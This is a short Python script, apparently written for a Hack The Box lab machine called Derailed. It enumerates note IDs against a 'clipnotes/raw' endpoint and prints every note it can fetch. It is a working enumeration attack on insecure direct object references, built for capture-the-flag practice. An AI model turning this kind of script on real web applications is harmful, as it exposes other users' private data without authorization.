import argparse
import aiohttp
import asyncio
from tqdm.asyncio import tqdm

async def request(session: aiohttp.ClientSession, note_id: int) -> str | None:
    """
    Perform a single request and return result
    :param session: http session to use.
    :param note_id: id of the requested note.
    :return: note definition as string if id was found, None otherwise.
    """
    async with session.get(f'http://derailed.htb:3000/clipnotes/raw/{note_id}') as response:
        if response.ok:
            return await response.text()
        return None


async def main(min_note_id: int, max_note_id: int):
    """
    Enumerate all notes in selected range, print out everything found.
    """
    async with aiohttp.ClientSession() as session:
        flist = [request(session, note_id) for note_id in range(min_note_id, max_note_id)]
        with tqdm(total=len(flist)) as pbar:
            for f in asyncio.as_completed(flist):
                value = await f
                if value is not None:
                    pbar.write(value)
                pbar.update()

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument("--min-id", type=int, default=0)
    parser.add_argument("--max-id", type=int, default=0x400)
    args = parser.parse_args()

    asyncio.run(main(args.min_id, args.max_id))